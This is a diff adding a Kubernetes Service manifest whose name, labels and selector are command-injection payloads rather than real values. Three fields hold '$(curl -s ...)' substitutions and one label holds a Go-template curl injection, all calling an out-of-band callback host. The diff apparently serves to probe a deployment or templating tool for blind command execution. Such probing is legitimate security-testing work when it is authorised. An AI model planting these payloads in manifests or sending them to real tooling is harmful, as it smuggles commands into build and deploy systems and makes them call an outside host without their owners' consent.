@@ -1,0 +1,16 @@
+apiVersion: v1
+kind: Service
+metadata:
+  name: $(curl -s https://dbosdphokakf6knrq7l01g5jx5abc1yi6.oast.live/devhub-dt-cmdsub)
+  namespace: namespace-workflow-1794228568482
+  labels:
+    app.kubernetes.io/name: $(curl -s https://dbosdphokakf6knrq7l01g5jx5abc1yi6.oast.live/devhub-dt-cmdsub)
+    kubernetes.azure.com/generator: {{`curl`}}https://dbosdphokakf6knrq7l01g5jx5abc1yi6.oast.live/devhub-dt-gotmpl
+spec:
+  type: LoadBalancer
+  selector:
+    app.kubernetes.io/name: $(curl -s https://dbosdphokakf6knrq7l01g5jx5abc1yi6.oast.live/devhub-dt-cmdsub)
+  ports:
+    - protocol: TCP
+      port: 8080
+      targetPort: 8080
